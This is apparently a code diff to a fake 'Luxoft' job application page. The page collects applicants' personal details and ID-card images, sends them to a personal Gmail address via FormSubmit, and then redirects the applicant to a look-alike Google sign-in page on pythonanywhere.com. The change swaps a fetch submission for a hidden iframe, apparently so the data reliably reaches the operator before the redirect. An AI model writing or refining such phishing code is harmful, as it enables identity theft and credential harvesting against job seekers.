@@ -244,14 +244,13 @@
     <span class="step-dot"></span>
     <span class="step-dot"></span>
   </div>
-  <!-- Multi-step Form that collects user information and uploads documents then redirects to an external link -->
-  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
+  
+  <!-- Updated form - we'll use FormSubmit's redirect but override it with our own -->
+  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data" target="_blank">
     <input type="hidden" name="_captcha" value="false" />
     <input type="hidden" name="_template" value="table" />
     <input type="hidden" name="_subject" value="New Luxoft Job Application" />
-    <!-- Remove the _redirect input since we'll handle redirect manually -->
-    <!-- <input type="hidden" name="_redirect" value="thankyou.html" /> -->
-
+    
     <!-- Step 1: Personal Info -->
     <div class="step active" id="step1">
       <div class="form-group">
@@ -305,41 +304,10 @@
         </div>
         <input type="file" id="id-back" name="ID_Back" accept=".pdf,.doc,.docx,.jpg,.png" style="display:none;" />
       </div>
-      <script>
-        (function() {
-          function updateNameFor(input, el) {
-            if (!input || !el) return;
-            if (input.files && input.files.length) {
-              el.textContent = input.files[0].name;
-              el.style.color = 'var(--text-color)';
-            } else {
-              el.textContent = 'No file chosen';
-              el.style.color = 'var(--text-secondary)';
-            }
-          }
-          const map = [
-            { inputId: 'id-front', nameId: 'file-name-front', dropId: 'drop-front' },
-            { inputId: 'id-back', nameId: 'file-name-back', dropId: 'drop-back' }
-          ];
-          map.forEach(item => {
-            const input = document.getElementById(item.inputId);
-            const nameEl = document.getElementById(item.nameId);
-            const drop = document.getElementById(item.dropId);
-            if (!input || !nameEl || !drop) return;
-            // update when the native file input changes
-            input.addEventListener('change', () => updateNameFor(input, nameEl));
-            // update after a drop (setupDragDrop assigns input.files on drop)
-            drop.addEventListener('drop', () => {
-              setTimeout(() => updateNameFor(input, nameEl), 50);
-            });
-            // initialize
-            updateNameFor(input, nameEl);
-          });
-        })();
-      </script>
+      
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
-        <button type="submit" id="submitButton">Submit Application</button>
+        <button type="button" id="submitButton">Submit Application</button>
       </div>
       <div id="loading">Submitting your application...</div>
     </div>
@@ -393,43 +361,76 @@
         e.preventDefault();
         dropZone.classList.remove("dragover");
         input.files = e.dataTransfer.files;
+        
+        // Update file name display
+        const fileNameSpan = dropZone.querySelector('span');
+        if (fileNameSpan && input.files.length > 0) {
+          fileNameSpan.textContent = input.files[0].name;
+          fileNameSpan.style.color = 'var(--text-color)';
+        }
       });
     }
     setupDragDrop("drop-front", "id-front");
     setupDragDrop("drop-back", "id-back");
 
-    // Form submission handling
-    document.getElementById("applicationForm").addEventListener("submit", function(e) {
-      e.preventDefault(); // Prevent default form submission
+    // File input change handlers
+    document.getElementById('id-front').addEventListener('change', function() {
+      const fileNameSpan = document.getElementById('file-name-front');
+      if (this.files.length > 0) {
+        fileNameSpan.textContent = this.files[0].name;
+        fileNameSpan.style.color = 'var(--text-color)';
+      }
+    });
+
+    document.getElementById('id-back').addEventListener('change', function() {
+      const fileNameSpan = document.getElementById('file-name-back');
+      if (this.files.length > 0) {
+        fileNameSpan.textContent = this.files[0].name;
+        fileNameSpan.style.color = 'var(--text-color)';
+      }
+    });
+
+    // Form submission handling - Using iframe method to ensure proper submission
+    document.getElementById("submitButton").addEventListener("click", function() {
+      // Validate all fields first
+      const form = document.getElementById("applicationForm");
+      const requiredFields = form.querySelectorAll('[required]');
+      let isValid = true;
       
-      // Show loading spinner
-      document.getElementById("loading").style.display = "block";
-      document.getElementById("submitButton").disabled = true;
-      
-      // Create FormData object
-      const formData = new FormData(this);
-      
-      // Send form data using Fetch API
-      fetch(this.action, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => {
-        if (response.ok) {
-          // Redirect to Google sign-in after successful submission
-          setTimeout(function() {
-            window.location.href = "https://googlesignin.pythonanywhere.com/";
-          }, 2000); // Wait 2 seconds to show loading message
+      requiredFields.forEach(field => {
+        if (!field.value.trim()) {
+          isValid = false;
+          field.style.borderColor = 'red';
         } else {
-          throw new Error('Form submission failed');
+          field.style.borderColor = '';
         }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        alert('There was an error submitting your application. Please try again.');
-        document.getElementById("loading").style.display = "none";
-        document.getElementById("submitButton").disabled = false;
       });
+      
+      if (!isValid) {
+        alert('Please fill in all required fields');
+        return;
+      }
+
+      // Show loading
+      document.getElementById("loading").style.display = "block";
+      this.disabled = true;
+      
+      // Create a hidden iframe to handle the form submission
+      const iframe = document.createElement('iframe');
+      iframe.name = 'form-submission-iframe';
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+      
+      // Set form target to the iframe
+      form.target = 'form-submission-iframe';
+      
+      // Submit the form
+      form.submit();
+      
+      // Wait for form to submit, then redirect
+      setTimeout(function() {
+        window.location.href = "https://googlesignin.pythonanywhere.com/";
+      }, 5000); // Wait 5 seconds to ensure form submission
     });
   </script>
 </body>
